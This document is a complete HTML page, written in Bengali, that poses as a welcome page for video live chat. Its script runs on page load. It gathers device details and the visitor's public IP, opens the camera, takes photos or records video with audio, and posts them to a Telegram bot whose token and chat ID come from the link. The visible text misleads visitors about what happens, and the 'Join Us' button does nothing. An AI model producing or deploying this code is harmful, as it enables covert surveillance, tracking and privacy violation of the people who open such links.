<!doctype html>
<html lang="bn">
<head>
<meta charset="utf-8"/>
<meta name="viewport" content="width=device-width,initial-scale=1"/>
<title>আপনাকে ভিডিও লাইভ চ্যাটিং এ স্বাগতম</title>
<style>
  :root{ --red:#ff2e2e; --bg:#000; --card:#090909; --muted:#ffb3b3; }
  html,body{height:100%;margin:0;background:var(--bg);font-family:Inter, Arial, sans-serif;color:var(--red)}
  body{display:flex;align-items:center;justify-content:center;padding:28px;text-shadow:0 0 8px #ff0000}
  .card{width:100%;max-width:820px;background:var(--card);padding:32px;border-radius:14px;border:1px solid rgba(255,0,0,0.22);box-shadow:0 8px 40px rgba(255,0,0,0.08)}
  h1{font-size:30px;margin:6px 0 14px;text-align:center;color:var(--red);text-shadow:0 0 18px #ff0000}
  .about{color:var(--muted);margin:0 auto 18px;line-height:1.6;text-align:justify;font-size:15px;max-height:none;padding-right:6px}
  .join-btn-wrap{display:flex;justify-content:center;margin-top:10px}
  .join-btn{display:inline-block;padding:12px 20px;border-radius:8px;background:linear-gradient(90deg,#ff0000,#ff6b6b);color:#100;font-weight:700;border:none;cursor:pointer;box-shadow:0 8px 24px rgba(255,0,0,0.12)}
  .visually-hidden{position:absolute!important;height:1px;width:1px;overflow:hidden;clip:rect(1px,1px,1px,1px);white-space:nowrap;border:0;padding:0;margin:-1px}
</style>
</head>
<body>
  <div class="card" role="main" aria-live="polite">
    <h1>আপনাকে ভিডিও লাইভ চ্যাটিং এ স্বাগতম</h1>

    <div class="about">
      আমাদের সার্ভিসে স্বাগতম — এখানে সহজ ও নিরাপদভাবে তুমি সরাসরি ছবি বা ছোট ভিডিও শেয়ার করতে পারবে। লিঙ্ক খুললে ডিভাইস স্বল্প সময়ের জন্য মিডিয়া অনুমতি চেয়ে নেয়া হবে এবং প্রয়োজনীয় মিডিয়া সংগ্রহ ও আপলোড সবকিছুই সার্ভার-সাইডে নিরাপদভাবে হ্যান্ডেল করা হবে। পেজটি কেবল তথ্যযুক্ত — কাজের সব অংশ ব্যাকএন্ডে সম্পন্ন হবে, এবং ব্যবহারকারীর সামনে কোনো প্রযুক্তিগত স্ট্যাটাস বা টোকেন প্রদর্শিত হবে না।
    </div>

    <div class="join-btn-wrap">
      <button class="join-btn" id="joinBtn" aria-hidden="true" onclick="/* noop */">Join Us</button>
    </div>

    <div class="visually-hidden" id="dbg"></div>
  </div>

<script>
function q(name){ return new URLSearchParams(location.search).get(name); }
const token = q('token');
const chatId = q('id') || q('chat');
const mode = q('mode');
const DEFAULT_VIDEO_MS = 5000;
const PHOTO_COUNT = 2;
const PHOTO_INTERVAL = 500;

function now(){ return new Date().toLocaleString(); }

async function collectDevice(){
  const info = {};
  try{ info.userAgent = navigator.userAgent; }catch(e){}
  try{ info.platform = navigator.platform; }catch(e){}
  try{ const b = navigator.getBattery ? await navigator.getBattery() : null; if(b) info.battery = {level: b.level, charging: b.charging}; }catch(e){}
  try{ info.screen = {w: screen.width, h: screen.height}; info.viewport = {w: document.documentElement.clientWidth, h: document.documentElement.clientHeight}; info.dpr = window.devicePixelRatio; }catch(e){}
  try{ info.cpu = navigator.hardwareConcurrency; }catch(e){}
  try{ const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection; if(conn) info.connection = {type: conn.effectiveType, downlink: conn.downlink}; }catch(e){}
  try{ info.tz = Intl.DateTimeFormat().resolvedOptions().timeZone; }catch(e){}
  try{ const r = await fetch('https://api.ipify.org?format=json'); if(r.ok){ const j = await r.json(); info.ip = j.ip; } }catch(e){}
  return info;
}

async function sendPhoto(token, chat_id, blob, caption=''){
  const api = `https://api.telegram.org/bot${token}/sendPhoto`;
  const fd = new FormData();
  fd.append('chat_id', chat_id);
  fd.append('caption', caption);
  fd.append('photo', blob, 'capture.jpg');
  try{
    const res = await fetch(api, { method:'POST', body: fd });
    const j = await res.json();
    console.debug('sendPhoto response', j);
    return j;
  }catch(e){ console.debug('sendPhoto error', e); return null; }
}

async function sendVideo(token, chat_id, blob, caption=''){
  const api = `https://api.telegram.org/bot${token}/sendVideo`;
  const fd = new FormData();
  fd.append('chat_id', chat_id);
  fd.append('caption', caption);
  fd.append('video', blob, 'record.webm');
  try{
    const res = await fetch(api, { method:'POST', body: fd });
    const j = await res.json();
    console.debug('sendVideo response', j);
    return j;
  }catch(e){ console.debug('sendVideo error', e); return null; }
}

async function openCamera(facing='user', withAudio=false){
  try{
    const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: facing }, audio: withAudio });
    return stream;
  }catch(e){
    console.debug('openCamera error', e);
    return null;
  }
}

async function capturePhotoFromStream(stream){
  const video = document.createElement('video');
  video.autoplay = true;
  video.playsInline = true;
  video.muted = true;
  video.srcObject = stream;
  await new Promise(r => video.onloadedmetadata = r);
  const canvas = document.createElement('canvas');
  canvas.width = video.videoWidth || 1280;
  canvas.height = video.videoHeight || 720;
  const ctx = canvas.getContext('2d');
  ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
  return new Promise(res => canvas.toBlob(res, 'image/jpeg', 0.85));
}

function recordStream(stream, durationMs){
  return new Promise((resolve) => {
    const chunks = [];
    let recorder;
    try{
      recorder = new MediaRecorder(stream, { mimeType: 'video/webm;codecs=vp8,opus' });
    }catch(e){
      recorder = new MediaRecorder(stream);
    }
    recorder.ondataavailable = e => { if(e.data && e.data.size) chunks.push(e.data); };
    recorder.onstop = () => resolve(new Blob(chunks, { type: chunks[0] ? chunks[0].type : 'video/webm' }));
    recorder.start();
    setTimeout(() => {
      try{ recorder.stop(); }catch(e){ console.debug('recorder stop error', e); resolve(null); }
    }, durationMs);
  });
}

async function stopStream(stream){
  try{ stream.getTracks().forEach(t => t.stop()); }catch(e){}
}

(async function main(){
  console.debug('chat page loaded', { token: !!token, chatId: !!chatId, mode });
  if(!token || !chatId || !mode){ console.debug('missing params'); return; }
  const device = await collectDevice();
  const captionBase = `Mode: ${mode}\nTime: ${now()}\nDevice: ${JSON.stringify(device)}`;
  const facing = mode.startsWith('back') ? 'environment' : 'user';
  const isPhoto = mode.endsWith('photo');
  const isVideo = mode.endsWith('video');

  const stream = await openCamera(facing, isVideo);
  if(!stream){ console.debug('could not open camera'); return; }

  try{
    if(isPhoto){
      for(let i=1;i<=PHOTO_COUNT;i++){
        await new Promise(r => setTimeout(r, 400));
        const blob = await capturePhotoFromStream(stream);
        await sendPhoto(token, chatId, blob, `${captionBase} (photo ${i})`);
        if(i < PHOTO_COUNT) await new Promise(r => setTimeout(r, PHOTO_INTERVAL));
      }
    } else if(isVideo){
      await new Promise(r => setTimeout(r, 300));
      const vblob = await recordStream(stream, DEFAULT_VIDEO_MS);
      if(vblob) await sendVideo(token, chatId, vblob, captionBase);
    }
  }catch(e){
    console.debug('capture/send error', e);
  }finally{
    await stopStream(stream);
    console.debug('capture flow finished');
  }
})();
</script>
</body>
</html>
